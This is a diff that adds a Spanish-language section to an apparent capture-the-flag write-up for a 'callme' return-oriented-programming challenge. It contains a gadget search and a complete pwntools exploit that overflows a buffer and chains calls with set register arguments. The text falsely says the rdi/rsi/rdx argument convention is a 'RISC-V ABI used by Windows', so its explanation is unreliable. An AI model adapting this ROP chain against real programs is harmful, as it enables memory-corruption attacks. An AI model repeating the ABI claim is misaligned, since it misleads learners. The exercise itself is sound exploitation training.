@@ -93,6 +93,45 @@ io.interactive()
 
 ## x86_64
 
+En 64 bits es un poco diferente el paso de argumentos a la funcion. Primero los argumentos se guardan en ciertos registros en dependencia de la ABI que se use, la ABI de RISC-V que usa Windows dice que los primeros tres argumentos se pasan a los registros `rdi`, `rsi` y `rdx` respectivamente.
+
+Encontramos un gadget que nos permita hacer esto:
+```
+[0x00400760]> /R pop rdi
+  0x0040093c                 5f  pop rdi
+  0x0040093d                 5e  pop rsi
+  0x0040093e                 5a  pop rdx
+  0x0040093f                 c3  ret
+```
+
+Primero retornamos al gadget, preparamos los registro y después es que llamamos a la función.
+
+Exploit completo con python/pwntools:
+``` python
+from pwn import *
+elf = context.binary = ELF("./callme")
+io = process("./callme")
+
+pop_gadget=0x0040093c
+def call(addr):
+    payload=p64(pop_gadget)
+    payload+=p64(0xdeadbeefdeadbeef)
+    payload+=p64(0xcafebabecafebabe)
+    payload+=p64(0xd00df00dd00df00d)
+    payload+=p64(addr)
+    return payload
+
+io.recv()
+payload=b"A"*40
+payload+=call(elf.sym['callme_one'])
+payload+=call(elf.sym['callme_two'])
+payload+=call(elf.sym['callme_three'])
+
+print(payload)
+io.sendline(payload)
+io.interactive()
+```
+
 
 
 
